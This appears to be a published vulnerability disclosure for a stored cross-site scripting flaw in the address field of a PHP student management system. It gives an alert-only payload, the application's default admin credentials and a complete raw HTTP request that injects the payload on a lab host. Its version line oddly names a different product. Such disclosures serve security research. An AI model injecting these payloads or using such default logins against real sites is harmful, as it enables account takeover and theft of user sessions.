# Online student management system  - 'address' Stored Cross-Site Scripting(XSS)


#### Exploit Title: Online student management system  - 'address' Stored Cross-Site Scripting(XSS)
#### Exploit Author: webraybtl@webray.com.cn inc
#### Vendor Homepage: https://www.sourcecodester.com/php/16137/online-student-management-system-php-free-download.html
#### Software Link:https://www.sourcecodester.com/download-code?nid=16137&title=Online+student+management+system+in+php+free+download
#### Version: Badminton Center Management System
#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description
Persistent XSS (or Stored XSS) attack is one of the three major categories of XSS attacks, the others being Non-Persistent (or Reflected) XSS and DOM-based XSS. In general, XSS attacks are based on the victim’s trust in a legitimate, but vulnerable, website or web application.Online student management system s' does not filter the content correctly at the "addres" module, resulting in the generation of stored XSS.

#### Payload used:

`<img src="" onerror="alert(111111111)">`

#### Proof of Concept

1. Login the CMS. 
   Admin Default Access:

   Username : mayurik
   Password : rootadmin

   

2. Open Page http://192.168.67.10/manage-students.php, Click the button to jump to the editing page.

   ![image-20231218155025560](img/Online student management system(XSS)/image-20231218155025560.png)

   http://192.168.67.10/edit-student-detail.php?editid=1

   ![image-20231218160309450](img/Online student management system(XSS)/image-20231218160309450.png)

   

   

3. Put XSS payload   in the "address"  ;

   send package

   

   ```
   POST /edit-student-detail.php?editid=1 HTTP/1.1
   Host: 192.168.67.10
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
   Accept-Encoding: gzip, deflate
   Content-Type: multipart/form-data; boundary=---------------------------33710977241900181722413261447
   Content-Length: 1790
   Origin: http://192.168.67.10
   Connection: close
   Referer: http://192.168.67.10/edit-student-detail.php?editid=1
   Cookie: PHPSESSID=41k6lb8lgvu5aiq908id5u1qgh
   Upgrade-Insecure-Requests: 1
   
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="stuname"
   
   Raghav Jain
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="stuemail"
   
   raghav@gmail.com
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="stuclass"
   
   1
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="gender"
   
   Male
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="dob"
   
   2023-02-12
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="stuid"
   
   FSA-1001
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="fname"
   
   Shantilal
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="mname"
   
   Jiya
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="connum"
   
   9090909090
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="altconnum"
   
   8080808080
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="address"
   
   <img src="" onerror="alert(111111111)">
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="uname"
   
   raghav@gmail.com
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="password"
   
   1b89744e90c7de7e76f25f281b924f44
   -----------------------------33710977241900181722413261447
   Content-Disposition: form-data; name="submit"
   
   
   -----------------------------33710977241900181722413261447--
   
   ```

   

   


4. back to http://192.168.67.10/edit-student-detail.php?editid=1 We can see the alert.;

   

   ![image-20231218155743009](img/Online student management system(XSS)/image-20231218155743009.png)

   

